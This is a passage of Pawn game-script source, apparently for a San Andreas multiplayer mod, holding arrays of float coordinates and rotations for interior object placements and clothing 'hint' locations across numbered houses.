		{267.9914,307.7230,998.2152,95.9000,-82.8000,-51.7000},
		{267.5364,307.2350,998.1726,0.0000,-89.1999,36.6000}
	},
	{//12
		{2456.3078,-1705.5811,1013.4035,83.5000,-83.3999,178.5000},
		{2456.6608,-1705.1473,1013.3914,82.9999,-79.8000,0.0000},
		{2456.4794,-1706.0928,1013.4514,86.0999,-87.6999,0.0000},
		{2456.6206,-1706.1218,1012.9425,-96.0000,-86.8000,177.9000},
		{2456.4226,-1705.2784,1012.9296,82.9999,-83.2000,-154.2000},
		{2456.3483,-1706.1225,1012.8743,95.1000,88.1000,10.1999},
		{2456.5654,-1705.1896,1012.5889,88.1999,-91.4999,-163.5000},
		{2456.4628,-1705.3089,1012.6160,-85.3999,-83.5999,-172.7000},
		{2456.3881,-1706.5881,1012.5346,0.0000,-88.9998,-94.0000}
	},
	{//13
		{2490.9672,-1703.6319,1018.5425,8.6000,-88.2000,-176.2999},
		{2491.0219,-1703.8283,1017.7672,88.9999,-96.5999,0.0000},
		{2490.7775,-1704.3631,1018.3134,-91.9000,-79.4999,0.0000},
		{2490.9799,-1705.2810,1018.2678,93.4999,99.2000,0.0000},
		{2490.9760,-1704.5550,1017.7200,80.6000,-79.4999,0.0000},
		{2491.0080,-1703.9350,1017.3984,77.6000,-72.2000,0.0000},
		{2490.9016,-1705.2501,1017.7492,91.1000,-50.0000,-19.2999},
		{2491.1857,-1704.1281,1017.7471,97.9999,-88.3000,-42.3999},
		{2490.8156,-1704.9768,1017.3994,87.4000,11.4000,0.0000}
	},
	{//14
		{2259.1115,-1218.4588,1048.9615,-95.1999,-72.2999,99.7999},
		{2258.0651,-1218.3839,1048.9776,-96.2999,-78.6999,97.3000},
		{2257.5622,-1218.3745,1048.3883,86.4999,-81.4000,73.5999},
		{2258.5187,-1218.3576,1048.3851,85.7000,-79.5000,75.4000},
		{2259.0212,-1218.2510,1048.9621,-94.7999,-77.7999,90.5999},
		{2259.0625,-1218.4287,1048.1147,-96.5000,-79.6999,92.3000},
		{2257.6025,-1218.1820,1048.9219,89.0000,-79.3000,65.8999},
		{2259.3522,-1218.2247,1048.4383,-86.6000,-80.3999,95.2999},
		{2258.0666,-1218.3903,1048.1110,-93.2000,0.0000,101.4000}
	},
	{//15
		{239.8925,1108.8837,1080.0909,-95.0999,-83.9000,83.6999},
		{238.8362,1108.9508,1080.0975,-96.2000,-80.9999,97.5000},
		{239.9271,1109.0430,1080.9439,-95.9000,-82.5999,112.7000},
		{238.3878,1108.8118,1080.8919,84.2999,-81.6999,89.9999},
		{239.3591,1109.0684,1080.9586,-96.5999,-79.5999,93.6000},
		{238.8908,1108.9544,1080.4282,-96.2999,-76.7000,98.5999},
		{239.6046,1109.1262,1080.4099,-92.7999,-86.1999,102.7000},
		{240.0611,1109.1127,1080.4090,-86.4000,-73.6999,109.0000},
		{239.9414,1108.9359,1080.3658,85.6999,0.0000,-85.3000}
	},
	{//16
		{235.7943,1186.8220,1084.3284,83.9000,-81.3999,85.6999},
		{234.7190,1186.8229,1084.3195,83.4000,-73.4999,78.3999},
		{236.2904,1186.7952,1083.8651,-94.7999,-78.5999,89.9000},
		{235.1794,1186.8266,1083.8560,-95.3000,-81.6000,99.0999},
		{234.9258,1186.9843,1084.3273,97.2999,100.0000,-83.7999},
		{235.7303,1187.0360,1084.3193,83.4000,-74.2999,77.2999},
		{236.1053,1186.9926,1083.4766,88.1000,0.0000,0.0000},
		{235.6629,1187.1165,1083.4848,95.6000,-79.3000,71.1999},
		{234.8319,1187.1558,1083.5410,-93.6999,0.0000,-99.7000}
	},
	{//17
		{223.7571,1247.4721,1082.1040,-95.5999,-83.8999,-85.4999},
		{224.7052,1247.5439,1082.0895,-95.7999,-79.0000,-85.9000},
		{223.6694,1247.4763,1081.5589,-96.6999,-85.9000,-81.4999},
		{224.7362,1247.5294,1081.5623,-94.4000,-92.0999,-95.6999},
		{224.9031,1247.3306,1082.0892,-97.4000,-89.1000,-93.5000},
		{223.6643,1247.4885,1081.2397,-96.3999,-80.6000,-85.5000},
		{223.8374,1247.3553,1082.0749,-86.0999,0.0000,0.0000},
		{224.0275,1247.3109,1081.5651,-88.8999,0.0000,0.0000},
		{224.6838,1247.4006,1081.1616,84.4999,0.0000,96.7999}
	},
	{//18
		{230.4987,1291.7316,1082.1445,-94.7000,-83.0999,-92.5000},
		{231.9430,1291.7117,1082.0645,82.9000,-80.4000,-99.6999},
		{230.4243,1291.7128,1081.5954,-96.0000,-90.5000,-93.5999},
		{231.9796,1291.7144,1081.5447,84.8999,-90.2000,-89.3000},
		{230.7390,1291.5628,1082.1367,-95.7999,-81.7999,-98.9999},
		{230.4246,1291.7406,1081.2797,-96.4000,-82.4999,-95.2999},
		{231.3169,1291.5233,1082.1241,-80.3999,0.0000,0.0000},
		{231.0770,1291.5345,1081.6129,-92.5999,0.0000,0.0000},
		{231.4147,1291.5936,1081.3225,-92.0999,0.0000,-84.6000}
	},
	{//19
		{36.2972,1341.6853,1088.7268,96.8000,114.5999,-17.3999},
		{36.1804,1343.1953,1088.8068,-83.5998,85.8999,0.0000},
		{36.2725,1341.6810,1088.2186,95.7000,82.1999,11.1999},
		{36.2382,1343.2108,1088.2773,-83.8000,94.6999,5.3999},
		{36.0467,1342.8043,1088.7895,-84.2999,86.1000,0.0000},
		{36.1500,1341.6118,1087.8713,96.1999,88.5999,11.6999},
		{36.1397,1342.3125,1088.7877,-92.2000,92.7999,0.0000},
		{36.0936,1341.9273,1088.7988,-93.7999,100.3999,0.0000},
		{36.0766,1343.2192,1087.8703,83.3999,0.1999,-1.2000}
	},
	{//20
		{289.1054,1474.3790,1080.1403,82.6999,-76.2999,0.0000},
		{289.0731,1475.4725,1080.1424,83.1000,-62.8999,-12.3000},
		{289.1487,1474.3052,1079.6361,86.8000,-91.6999,0.0000},
		{289.1153,1475.4134,1079.6175,85.2000,-80.5999,-4.9999},
		{289.3547,1474.4068,1080.1578,84.5000,-80.6999,0.0000},
		{289.1607,1474.4454,1079.2713,84.1999,-81.6000,0.0000},
		{289.3297,1475.3555,1080.1627,88.8999,-88.6000,0.0000},
		{289.3743,1474.8734,1079.6262,95.6999,-72.6000,0.0000},
		{289.2080,1475.4899,1079.2803,85.1999,0.0000,0.0000}
	},
	{//21
		{2335.0346,-1140.8133,1054.2668,84.8999,-87.8999,0.0000},
		{2335.0905,-1142.2985,1054.3415,-96.6000,-75.7000,2.4000},
		{2335.0964,-1140.7807,1053.7542,85.8999,-88.2999,0.0000},
		{2335.0932,-1141.8690,1053.7686,85.7999,-87.8999,0.0000},
		{2335.2182,-1141.0332,1054.2659,82.9000,-81.8000,0.0000},
		{2335.0808,-1140.8208,1053.3977,82.6999,-77.2000,2.5000},
		{2335.2526,-1141.1015,1053.7395,86.7999,-81.0000,0.0000},
		{2335.2692,-1141.6052,1053.7467,94.4000,-80.9000,-0.5999},
		{2334.9372,-1141.9320,1053.4128,84.3999,0.0000,0.0000}
	},
	{//22
		{-275.6310,1458.4064,1088.9001,-96.2999,-81.5999,-88.1000},
		{-274.8081,1458.2766,1088.8835,-96.6999,-84.5000,-82.7999},
		{-275.6578,1458.3278,1088.3679,-95.8999,-85.0000,-83.7000},
		{-274.6427,1458.2800,1088.3547,-94.8999,-83.2000,-87.0000},
		{-274.4346,1458.2713,1088.0075,-95.7999,-82.2000,-85.2999},
		{-275.6234,1458.1972,1088.0290,-97.4000,-75.9999,-79.1000},
		{-274.5433,1458.2071,1088.8630,-85.9999,0.0000,0.0000},
		{-275.5432,1458.2261,1088.8791,-87.7000,0.0000,0.0000},
		{-275.7035,1458.6300,1088.0202,-93.2999,0.0000,-90.5999}
	},
	{//23
		{332.3899,1491.6118,1084.3791,84.7999,-83.8999,-98.4999},
		{331.4678,1491.6483,1084.3801,83.6000,-81.1999,-96.9000},
		{330.8373,1491.6315,1083.9146,-95.1000,-87.3000,-86.7000},
		{332.4017,1491.6661,1083.8631,85.8001,-91.0999,-91.2999},
		{331.7659,1491.4316,1083.8620,84.4000,-92.6999,-87.8999},
		{332.4078,1491.6157,1083.5129,83.6000,-83.0999,-88.7999},
		{331.8088,1491.4703,1084.4344,-85.9999,0.0000,0.0000},
		{330.7988,1491.4667,1084.4477,-88.3999,0.0000,0.0000},
		{330.8575,1491.7581,1083.5954,-93.2000,0.0000,-93.3999}
	},
	{
		{15.2021,1410.8082,1084.3870,84.0999,-85.1999,0.0000},
		{15.2666,1411.7551,1084.3815,84.5000,-95.3000,0.0000},
		{15.2190,1410.7185,1083.8736,86.3000,-77.3999,-12.7999},
		{15.2654,1411.7731,1083.8763,86.1999,-91.7000,0.0000},
		{15.4718,1411.2347,1083.8482,83.5999,-85.4000,0.0000},
		{15.2831,1411.7567,1083.5112,84.0999,-94.1999,1.3999},
		{15.4275,1410.7847,1084.4072,91.9999,-105.0999,0.0000},
		{15.3657,1411.5898,1084.3947,95.0999,-86.4999,0.0999},
		{15.3400,1410.8660,1083.5299,85.3000,0.0000,0.0000}
	},
	{
		{378.0986,1469.3696,1080.2031,-95.8000,-74.5000,-86.2000},
		{379.0852,1469.5120,1080.2027,-96.2999,-79.8999,-93.8000},
		{378.0252,1469.3663,1079.6573,-95.5000,-82.5000,-83.4999},
		{379.5708,1469.3134,1079.6224,85.2000,-80.9999,-98.4999},
		{379.1604,1469.2324,1080.1846,-96.4999,-76.6999,-93.2999},
		{378.0580,1469.4152,1079.3438,-96.8000,-67.8999,-81.3000},
		{378.5576,1469.1242,1080.2122,-92.6000,-83.6000,-81.2000},
		{378.8966,1469.2093,1079.6074,94.7999,-74.5999,-100.2999},
		{379.1741,1469.1052,1079.2863,86.8999,0.0000,107.9000}
	},
	{
		{359.2514,1418.3083,1081.3470,-94.2000,-83.0000,-86.2999},
		{360.2318,1418.3282,1081.3535,-96.0999,-80.5000,-92.7999},
		{359.1972,1418.2072,1080.8242,-95.6000,-87.3999,-87.0000},
		{360.2810,1418.3123,1080.8214,-96.6999,-81.4999,-80.4000},
		{359.4210,1418.0992,1081.3474,-96.6000,-80.9999,-86.4000},
		{359.2064,1418.2963,1080.4909,-96.5999,-78.9999,-82.2000},
		{360.2532,1418.0867,1081.3291,-89.0999,0.0000,0.0000},
		{359.8768,1418.0490,1080.8067,-87.6000,-74.1999,-77.2999},
		{360.0738,1418.1641,1080.4312,85.1000,0.0000,99.2000}
	},
	{
		{443.0115,1405.0208,1084.2440,83.6000,-83.0999,-92.8000},
		{441.9963,1405.0355,1084.2547,84.2999,-84.9000,-94.6999},
		{442.6194,1405.0794,1083.7641,-95.5999,-93.2000,-98.6000},
		{441.5326,1405.0125,1083.8045,-95.0999,-81.6000,-86.4000},
		{441.3361,1404.9533,1084.3001,-94.6999,-89.2999,-115.1999},
		{443.0057,1404.8464,1083.3889,84.2999,-86.2000,-103.8999},
		{442.8976,1404.8208,1084.2971,-83.6000,0.0000,-10.5999},
		{442.3947,1404.9295,1084.2897,-85.1999,-74.5999,-103.1999},
		{441.9829,1405.0664,1083.3948,85.1999,0.0000,-86.4999}
	},
	{//28
		{139.5393,1387.2630,1088.3771,-94.9000,-83.1999,-90.4000},
		{138.4906,1387.2687,1088.3963,-96.7000,-80.4000,-85.1000},
		{138.4919,1387.1800,1087.8455,-95.2000,-87.4999,-89.2999},
		{139.5744,1387.2929,1087.8499,-95.0999,-85.2000,-91.3000},
		{138.6838,1387.0744,1088.3709,-96.4000,-79.7999,-93.5999},
		{139.4894,1387.2623,1087.5374,-96.4000,-77.1999,-88.3999},
		{138.9522,1387.0273,1087.8626,-93.3000,-87.0000,-79.2999},
		{139.5044,1387.1138,1088.3745,-86.6000,-79.4000,-88.7000},
		{138.4707,1387.2677,1087.4567,84.4000,0.0000,89.6999}
	},
	{//29
		{494.9739,1418.9226,1083.8183,-95.8999,-86.1999,176.6000},
		{494.9869,1417.8325,1083.8312,-83.6999,95.6000,0.0000},
		{494.9095,1418.9095,1084.3533,-83.8999,85.1000,0.0000},
		{494.8813,1417.8078,1084.3779,-83.0999,79.5999,-7.0999},
		{494.6785,1418.6434,1083.8275,-81.0999,82.3999,-7.5000},
		{494.8487,1418.9486,1083.5175,-82.4999,90.2999,0.0000},
		{494.7759,1417.7967,1083.8186,-86.9000,81.4999,0.0000},
		{494.7192,1418.5797,1084.3616,-93.1000,95.9000,0.0000},
		{494.9457,1417.8906,1083.4405,83.8999,0.0000,0.0000}
	},
	{//30 = 9
		{230.4967,1078.5915,1088.0456,14.4000,-81.0999,-85.6999},
		{232.2165,1078.7932,1087.3403,-99.5999,-83.7997,97.1000},
		{230.6073,1078.7187,1087.2849,-94.1999,-90.1999,-80.9999},
		{231.0201,1078.7014,1087.7584,84.4999,-49.5000,57.4000},
		{232.3048,1078.9715,1086.9033,74.8999,-97.5999,0.0000},
		{230.5998,1078.8149,1086.9871,-108.1000,-10.4000,0.0000},
		{232.0678,1078.7966,1087.7777,85.5000,-95.3000,61.7999},
		{231.8922,1078.7626,1086.9039,87.2000,-95.2999,-49.7999},
		{231.0660,1078.5925,1086.8918,85.1000,0.0000,113.1999}
	},
	{//31
		{255.4060,1285.6734,1080.1672,70.8000,-149.9000,0.0000},
		{253.7120,1285.5667,1080.4263,171.7998,92.4000,97.1000},
		{255.5195,1285.7003,1079.6258,97.0000,149.3000,38.2999},
		{253.8892,1285.7191,1079.6839,93.4999,2.9000,0.0000},
		{254.2004,1285.8594,1080.2132,-81.0999,95.8999,0.0000},
		{255.4808,1285.5416,1079.3565,-99.9998,-160.4000,0.0000},
		{254.7713,1285.8673,1080.1507,89.7000,-104.0000,0.0000},
		{253.8621,1285.8532,1079.2872,92.0000,-89.0999,0.0000},
		{254.0390,1285.5997,1079.3645,-93.6999,47.8000,-6.1999}
	},
	{//32
		{-72.2672,1365.2690,1080.3819,8.8000,-89.0999,0.0000},
		{-72.4729,1367.1359,1080.3486,170.5000,90.1000,8.4999},
		{-72.3257,1365.6975,1080.1779,-95.1999,-88.3000,0.0000},
		{-72.1813,1365.9337,1079.6055,84.5999,-96.9999,0.0000},
		{-72.1491,1366.8988,1079.6173,-95.4000,-80.1000,24.8999},
		{-72.1153,1365.9339,1079.2199,83.2000,-85.0999,0.0000},
		{-72.2038,1366.4986,1080.1407,-90.0999,-77.8000,0.0000},
		{-72.3567,1366.7307,1079.5688,89.0999,-90.9000,0.0000},
		{-72.3121,1366.4624,1079.3374,-1.2999,87.6001,83.6000}
	},
	{//33
		{2819.7800,-1169.7453,1029.3458,8.2999,-87.0999,0.0000},
		{2819.5563,-1167.8455,1029.3265,-14.2000,-85.7000,0.0000},
		{2819.7409,-1168.5109,1029.0617,94.8000,96.4999,0.0000},
		{2819.6308,-1169.0577,1028.5076,81.5999,-91.0999,0.0000},
		{2819.5979,-1169.0454,1029.0559,79.6999,-86.5999,51.3999},
		{2819.5966,-1169.0598,1028.1890,83.4999,-81.8000,0.0000},
		{2819.5048,-1168.3656,1028.5197,89.6000,-38.1000,0.0000},
		{2819.6105,-1168.2675,1028.5677,-85.7000,-40.1000,0.0000},
		{2819.4658,-1168.0531,1028.1804,87.1999,20.5000,0.0000}
	},
	{//34 = 7
		{2213.0502,-1078.5592,1050.7282,9.3000,-83.3999,-85.9000},
		{2213.2331,-1078.2573,1049.6422,82.6000,15.1000,0.0000},
		{2213.4951,-1078.4422,1050.5198,-91.7000,-2.8999,0.0000},
		{2214.5710,-1078.2583,1049.9890,-96.4999,-88.3000,108.1000},
		{2213.1699,-1078.2252,1049.9061,81.4999,-90.7999,0.0000},
		{2214.4401,-1078.2912,1049.6586,-96.1999,-91.0000,93.8000},
		{2214.5205,-1078.3054,1050.4462,85.6000,-96.8000,0.0000},
		{2213.6228,-1078.3291,1049.9040,92.6000,-86.2000,0.0000},
		{2214.7204,-1078.5628,1050.6632,-2.5000,10.3999,-3.3999}
	},
	{//35
		{2245.6208,-1078.0408,1049.1623,16.5999,-88.2999,0.0000},
		{2245.5698,-1076.2940,1049.1503,-17.0000,-84.7000,0.0000},
		{2245.6625,-1077.1047,1048.9124,83.7999,-84.7000,0.0000},
		{2245.6166,-1076.9239,1048.4226,-95.1000,-90.3000,0.0000},
		{2245.4377,-1076.7248,1048.8959,79.1999,-84.3999,155.4999},
		{2245.3645,-1076.4412,1048.0433,85.3000,-75.3999,0.0000},
		{2245.2890,-1077.8365,1048.3950,88.2999,-96.8999,50.3000},
		{2245.3842,-1077.4139,1048.3725,86.9999,-37.5999,0.0000},
		{2245.3469,-1077.5146,1048.0380,82.9999,-21.0000,0.0000}
	},
	{//36 = 5
		{2363.0830,-1135.2955,1051.1525,7.2000,-89.3999,5.9999},
		{2362.8430,-1133.5778,1050.2916,80.7000,-91.4999,4.0999},
		{2363.0356,-1134.7260,1050.3225,84.7001,-91.7999,-15.2999},
		{2362.9033,-1133.5949,1050.8293,83.8000,-93.8000,0.0000},
		{2362.9553,-1134.6196,1050.8431,84.4999,-80.2999,11.3000},
		{2362.8706,-1134.0915,1050.0480,-95.4999,-88.6999,0.0000},
		{2362.8764,-1135.3797,1050.0174,-85.7000,-103.9999,5.2999},
		{2362.9414,-1134.5920,1049.9790,91.7000,-90.0999,0.0000},
		{2362.9582,-1133.7320,1050.3035,86.8999,0.0000,0.0000}
	},
	{//37
		{-41.6386,1412.7680,1084.6761,10.5000,-77.9000,102.9000},
		{-43.4732,1412.7374,1084.5902,-14.8000,-76.6999,96.9999},
		{-42.4834,1412.8143,1084.4294,-67.0999,13.8000,0.0000},
		{-43.3162,1412.8255,1084.5738,-28.4000,-76.1999,95.7000},
		{-41.5712,1412.9429,1083.7976,78.3999,-95.6000,0.0000},
		{-42.4863,1412.6728,1083.8813,-96.8999,-149.5000,0.0000},
		{-42.9541,1412.9147,1084.3524,87.7999,-97.2999,0.0000},
		{-41.7952,1412.5294,1083.5147,-84.6999,-85.4999,0.0000},
		{-43.1897,1412.7611,1083.5784,0.0000,87.5999,-15.8999}
	},
	{//38 = 8
		{92.3099,1332.3265,1088.5828,9.6000,-74.8000,-86.9999},
		{92.9487,1332.3618,1087.4586,83.4000,-88.6999,-102.7000},
		{92.9229,1332.4888,1087.8265,85.0000,-85.9000,-108.1999},
		{93.5603,1332.4053,1087.8052,86.8000,-90.8000,102.7000},
		{92.7731,1332.5959,1088.3270,81.7000,-87.2999,70.5000},
		{93.5145,1332.4875,1087.4589,83.4000,-85.3000,123.5999},
		{93.4993,1332.5137,1087.7939,88.4000,-102.8999,-106.3999},
		{93.2148,1332.5363,1087.4704,96.5000,-87.9000,-121.6999},
		{93.9607,1332.6926,1088.3223,83.5999,-62.7000,-4.2999}
	},
	{//39
		{256.3548,1244.0051,1084.2097,-98.7000,-86.5999,0.0000},
		{256.2642,1245.4951,1084.3514,16.6000,-69.2999,-178.2998},
		{256.3316,1243.8586,1083.6878,-99.2999,-83.9999,6.3999},
		{256.4181,1244.8297,1083.6614,-96.5999,-87.1999,0.0000},
		{256.5545,1245.0104,1084.1835,-97.5999,-78.0999,63.2000},
		{256.4557,1243.8541,1083.3726,-99.3000,-76.7999,0.0000},
		{256.6176,1244.7528,1083.3374,-98.9999,-139.1999,0.0000},
		{256.6083,1245.2900,1083.3148,-92.7999,-140.7999,0.0000},
		{256.3888,1243.6926,1084.3319,9.9000,0.0000,5.8999}
	},
	{//40 = 10
		{247.5639,306.4898,999.1984,-83.1999,168.1999,0.0000},
		{248.1473,306.3545,998.5646,79.9000,-20.6000,24.3999},
		{247.5267,306.2283,998.6350,86.6000,-80.6000,-116.1000},
		{248.7151,306.4465,999.4209,12.2000,-90.3000,92.8000},
		{248.4544,306.3364,999.1611,-97.0999,-128.8999,0.0000},
		{247.1092,306.3216,998.3325,-80.0999,39.5999,0.0000},
		{248.1372,306.1315,998.3295,-96.0000,-94.7000,0.0000},
		{248.6265,306.4161,998.2476,86.0000,-95.3999,0.0000},
		{246.8255,306.5256,999.3200,0.0000,-12.3999,-0.9000}
	},
	{//41
		{416.7353,2534.9340,10.1889,9.8999,-82.4000,-91.4000},
		{418.6109,2534.8391,10.1762,-16.2999,-77.8000,-75.6999},
		{417.7354,2534.9187,9.9454,73.2000,0.0000,0.0000},
		{416.9045,2534.9692,9.4110,-92.2999,-86.5999,-87.7000},
		{418.2468,2535.0405,9.4042,-92.5999,-90.0000,-144.5999},
		{416.8479,2535.1301,9.1300,-132.4999,3.1000,0.0000},
		{417.3960,2535.1157,9.9035,88.8000,-100.1999,0.0000},
		{418.0726,2535.0727,9.3532,86.5000,-90.8999,-24.0000},
		{418.4166,2535.1574,9.0597,87.5999,-54.6999,-14.0999}
	},
	{//42=17
		{223.7571,1247.4721,1082.1040,-95.5999,-83.8999,-85.4999},
		{224.7052,1247.5439,1082.0895,-95.7999,-79.0000,-85.9000},
		{223.6694,1247.4763,1081.5589,-96.6999,-85.9000,-81.4999},
		{224.7362,1247.5294,1081.5623,-94.4000,-92.0999,-95.6999},
		{224.9031,1247.3306,1082.0892,-97.4000,-89.1000,-93.5000},
		{223.6643,1247.4885,1081.2397,-96.3999,-80.6000,-85.5000},
		{223.8374,1247.3553,1082.0749,-86.0999,0.0000,0.0000},
		{224.0275,1247.3109,1081.5651,-88.8999,0.0000,0.0000},
		{224.6838,1247.4006,1081.1616,84.4999,0.0000,96.7999}
	}
};
new Float:gHintDress[HINTS_COUNT][3][6] = {
	{// 1
		{2230.7561,-1109.3177,1051.6035,0.0000,0.0000,87.6999},
		{2230.4709,-1109.3085,1051.6031,0.0000,0.0000,87.5000},
		{2230.1989,-1109.3076,1051.6131,0.0000,0.0000,86.8999}
	},
	{
		{2185.7556,-1215.1505,1049.7541,0.0000,0.0000,90.2000},
		{2186.0126,-1215.2023,1049.7639,0.0000,0.0000,92.6000},
		{2186.2758,-1215.2150,1049.7640,0.0000,0.0000,90.1999}
	},
	{
		{2321.4028,-1008.1798,1055.4594,0.0000,0.0000,0.0000},
		{2321.4079,-1008.4442,1055.4594,0.0000,0.0000,0.0000},
		{2321.3979,-1008.7277,1055.4593,0.0000,0.0000,0.0000}
	},
	{
		{2268.0490,-1137.0057,1051.3399,0.0000,0.0000,-93.8000},
		{2267.8422,-1136.9985,1051.3504,0.0000,0.0000,-91.1999},
		{2267.6376,-1137.0075,1051.3404,0.0000,0.0000,-89.5999}
	},
	{
		{2362.8381,-1134.1116,1051.6055,0.0000,0.0000,0.0000},
		{2362.8317,-1134.3430,1051.6151,0.0000,0.0000,0.0000},
		{2362.8374,-1133.8858,1051.5957,0.0000,0.0000,0.0000}
	},
	{
		{2281.1655,-1140.2518,1051.6091,0.0000,0.0000,97.1999},
		{2280.8806,-1140.2381,1051.6080,1.5999,0.0000,-88.3999},
		{2280.5556,-1140.2357,1051.6091,0.0000,0.0000,-90.1999}
	},
	{
		{2214.3535,-1078.4116,1051.2050,0.0000,0.0000,-88.0000},
		{2214.1384,-1078.4151,1051.2050,0.0000,0.0000,-84.0999},
		{2213.9343,-1078.4007,1051.2050,0.0000,0.0000,-85.8999}
	},
	{
		{93.9547,1332.5895,1089.0878,0.0000,0.0000,-88.4000},
		{93.6951,1332.5623,1089.0878,0.0000,0.0000,-85.3999},
		{93.3951,1332.5629,1089.0878,0.0000,0.0000,-87.3000}
	},
	{
		{231.6773,1078.7901,1088.5310,0.0000,0.0000,-95.3000},
		{231.3967,1078.7889,1088.5310,0.0000,0.0000,-86.6000},
		{230.9703,1078.7958,1088.5208,0.0000,0.0000,-97.5999}
	},
	{// 10
		{248.1866,306.3258,999.8886,0.0000,0.0000,-90.7999},
		{247.8925,306.3224,999.8785,0.0000,0.0000,-91.5000},
		{247.6226,306.3232,999.8887,0.0000,0.0000,-93.0999}
	},
	{
		{267.2603,307.1318,999.8288,0.0000,0.0000,-43.4999},
		{267.4571,307.3040,999.8383,0.0000,0.0000,131.2000},
		{267.6746,307.4893,999.8383,0.0000,0.0000,131.8999}
	},
	{// 12
		{2456.4367,-1705.1768,1014.1978,0.0000,0.0000,0.0000},
		{2456.4477,-1705.3992,1014.1981,0.0000,0.0000,0.0000},
		{2456.4277,-1705.6420,1014.1880,0.0000,0.0000,0.0000}
	},
	{// 13
		{2490.9521,-1705.2984,1019.0339,0.0000,0.0000,0.0000},
		{2490.9519,-1705.0588,1019.0339,0.0000,0.0000,0.0000},
		{2490.9323,-1704.8081,1019.0336,0.0000,0.0000,0.0000}
	},
	{//14
		{2258.7270,-1218.2954,1049.6840,0.0000,0.0000,92.8999},
		{2258.9287,-1218.2882,1049.6838,0.0000,0.0000,-92.3000},
		{2258.4926,-1218.2690,1049.6895,0.0999,0.0000,-93.4999}
	},
	{//15
		{239.7649,1109.0095,1081.6627,0.0000,0.0000,-94.3999},
		{239.4978,1109.0018,1081.6684,1.4000,0.3000,-90.3999},
		{239.2356,1108.9979,1081.6627,0.0000,0.0000,-92.5000}
	},
	{//16
		{235.8394,1186.9857,1085.1147,0.0000,0.0000,-94.7999},
		{235.2902,1186.9892,1085.1145,0.0000,0.0000,-91.1000},
		{235.5202,1186.9881,1085.1147,0.0000,0.0000,-91.9000}
	},
	{//17
		{223.5325,1247.4138,1082.8009,0.0000,0.0000,-85.6000},
		{223.7394,1247.4224,1082.8105,0.0000,0.0000,-87.5000},
		{223.9936,1247.4332,1082.8010,0.0000,0.0000,-92.3000}
	},
	{//18
		{231.7338,1291.6315,1082.8612,0.0000,0.0000,-89.8999},
		{231.4665,1291.6236,1082.8607,0.0000,0.0000,-90.7000},
		{231.2164,1291.6245,1082.8513,0.0000,0.0000,-90.5999}
	},
	{//19
		{36.1358,1342.8082,1089.5156,0.0000,0.0000,0.0000},
		{36.1558,1342.5882,1089.5255,0.0000,0.0000,0.0000},
		{36.1458,1342.3680,1089.5155,0.0000,0.0000,0.0000}
	},
	{//20
		{289.2781,1474.6901,1080.9283,0.0000,0.0000,0.0000},
		{289.2783,1474.4600,1080.9284,0.0000,0.0000,0.0000},
		{289.2682,1474.8903,1080.9184,0.0000,0.0000,0.0000}
	},
	{//21
		{2335.1701,-1140.9875,1055.0546,0.0000,0.0000,0.0000},
		{2335.1784,-1141.2189,1055.0451,0.0000,0.0000,0.0000},
		{2335.1755,-1141.4189,1055.0449,0.0000,0.0000,0.0000}
	},
	{
		{-274.4190,1458.3150,1089.5974,0.0000,0.0000,-86.0999},
		{-274.8084,1458.3132,1089.5977,0.0000,0.0000,-93.5999},
		{-274.6285,1458.3247,1089.5965,0.0000,0.0000,-90.0999}
	},
	{
		{332.2619,1491.5399,1085.1674,0.0000,0.0000,-93.6999},
		{331.8175,1491.5330,1085.1578,0.0000,0.0000,-91.4999},
		{331.5682,1491.5412,1085.1682,0.0000,0.0000,-92.0999}
	},
	{
		{15.3231,1410.4112,1085.1672,0.0000,0.0000,0.0000},
		{15.3331,1410.6710,1085.1671,0.0000,0.0000,0.0000},
		{15.3231,1410.8406,1085.1674,0.0000,0.0000,0.0000}
	},
	{
		{379.0177,1469.2437,1080.9151,0.0000,0.0000,-88.5999},
		{379.2108,1469.2636,1080.9251,0.0000,0.0000,-91.5999},
		{378.7455,1469.2509,1080.9056,0.0000,0.0000,-94.0999}
	},
	{
		{360.0541,1418.2092,1082.0560,0.0000,0.0000,-91.5999},
		{359.7888,1418.2208,1082.0662,0.0000,0.0000,-85.5999},
		{359.5729,1418.2239,1082.0661,0.0000,0.0000,-88.5000}
	},
	{
		{442.8853,1404.9498,1085.0253,0.0000,0.0000,-83.5000},
		{442.5996,1404.9448,1085.0250,-0.4999,0.0000,-85.4000},
		{442.2410,1404.9689,1085.0354,0.0000,0.0000,-88.4000}
	},
	{
		{138.9462,1387.1064,1089.0977,0.0000,0.0000,-88.7999},
		{139.2735,1387.1109,1089.0975,0.0000,0.0000,-86.9999},
		{139.5074,1387.1221,1089.1069,0.0000,0.0000,-87.2000}
	},
	{//29
		{494.7901,1417.7601,1085.0686,0.0000,0.0000,0.0000},
		{494.7901,1418.0297,1085.0677,0.0000,0.0000,0.0000},
		{494.7803,1418.4199,1085.0683,0.0000,0.0000,0.0000}
	},
	{//30 = 9
		{231.6773,1078.7901,1088.5310,0.0000,0.0000,-95.3000},
		{231.3967,1078.7889,1088.5310,0.0000,0.0000,-86.6000},
		{230.9703,1078.7958,1088.5208,0.0000,0.0000,-97.5999}
	},
	{
		{255.2463,1285.7261,1080.9078,0.0000,0.0000,-88.8999},
		{254.9406,1285.7218,1080.9152,0.0000,0.0000,-87.9999},
		{254.6030,1285.7338,1080.9051,0.0000,0.0000,-92.7999}
	},
	{
		{-72.2493,1365.7786,1080.8613,0.0000,0.0000,0.0000},
		{-72.2205,1366.0891,1080.8515,0.0000,0.0000,0.0000},
		{-72.2794,1366.7750,1080.8691,0.0000,0.0000,0.0000}
	},
	{//33
		{2819.6354,-1168.6489,1029.8032,0.0000,0.0000,0.0000},
		{2819.6479,-1169.2730,1029.8225,0.0000,0.0000,0.0000},
		{2819.6379,-1168.8729,1029.8225,0.0000,0.0000,0.0000}
	},
	{//34 = 7
		{2214.3535,-1078.4116,1051.2050,0.0000,0.0000,-88.0000},
		{2214.1384,-1078.4151,1051.2050,0.0000,0.0000,-84.0999},
		{2213.9343,-1078.4007,1051.2050,0.0000,0.0000,-85.8999}
	},
	{//35
		{2245.4472,-1076.9935,1049.6816,0.0000,0.0000,0.0000},
		{2245.4455,-1077.2581,1049.6740,0.0000,0.0000,0.0000},
		{2245.4355,-1077.4984,1049.6740,0.0000,0.0000,0.0000}
	},
	{//36 = 5
		{2362.8381,-1134.1116,1051.6055,0.0000,0.0000,0.0000},
		{2362.8317,-1134.3430,1051.6151,0.0000,0.0000,0.0000},
		{2362.8374,-1133.8858,1051.5957,0.0000,0.0000,0.0000}
	},
	{//37
		{-42.7864,1412.7080,1085.1103,0.0000,0.0000,92.5000},
		{-42.3435,1412.6968,1085.1003,0.0000,0.0000,90.0999},
